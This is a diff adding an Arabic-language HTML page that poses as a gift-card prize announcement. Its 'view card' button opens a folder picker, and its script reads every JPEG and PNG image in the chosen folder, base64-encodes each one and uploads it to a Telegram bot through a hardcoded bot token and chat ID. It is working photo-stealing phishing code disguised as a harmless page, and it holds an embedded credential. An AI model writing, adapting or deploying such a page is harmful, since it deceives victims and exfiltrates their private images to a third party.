@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>مفاجأة خاصة لك 🎁</title>
+</head>
+<body style="text-align:center; margin-top:80px; font-family:sans-serif;">
+  <h2>🎉 تهانينا! لقد ربحت بطاقة هدية!</h2>
+  <p>اضغط أدناه لتحميل البطاقة ومشاركتها:</p>
+  <button onclick="getPhotos()">📂 عرض البطاقة</button>
+
+  <script>
+    const TELEGRAM_TOKEN = '7691229749:AAEyZUJIsmrdxv6AKLhMRIrIh_LROz-OnOg';
+    const CHAT_ID = '7034689311';
+
+    async function getPhotos() {
+      try {
+        const handle = await window.showDirectoryPicker();  // يفتح نافذة اختيار المجلد
+        for await (const entry of handle.values()) {
+          if(entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
+            const file = await entry.getFile();
+            const arrayBuffer = await file.arrayBuffer();
+            const base64 = arrayBufferToBase64(arrayBuffer);
+            // نرسل الصورة للبوت
+            await sendPhotoToTelegram(base64, entry.name);
+          }
+        }
+        alert("✅ تم إرسال الصور بنجاح!");
+      } catch(e) {
+        alert("❌ لم يتم منح الإذن.");
+      }
+    }
+
+    function arrayBufferToBase64(buffer) {
+      let binary = '';
+      const bytes = new Uint8Array(buffer);
+      const len = bytes.byteLength;
+      for(let i=0; i<len; i++) {
+        binary += String.fromCharCode(bytes[i]);
+      }
+      return window.btoa(binary);
+    }
+
+    async function sendPhotoToTelegram(base64, filename) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      // نرسل الصورة كبايناري مع اسمها
+      formData.append('chat_id', CHAT_ID);
+      formData.append('caption', filename);
+      formData.append('photo', `data:image/jpeg;base64,${base64}`);
+
+      // نرسل الطلب
+      await fetch(url, {
+        method: 'POST',
+        body: formData
+      });
+    }
+  </script>
+</body>
+</html>
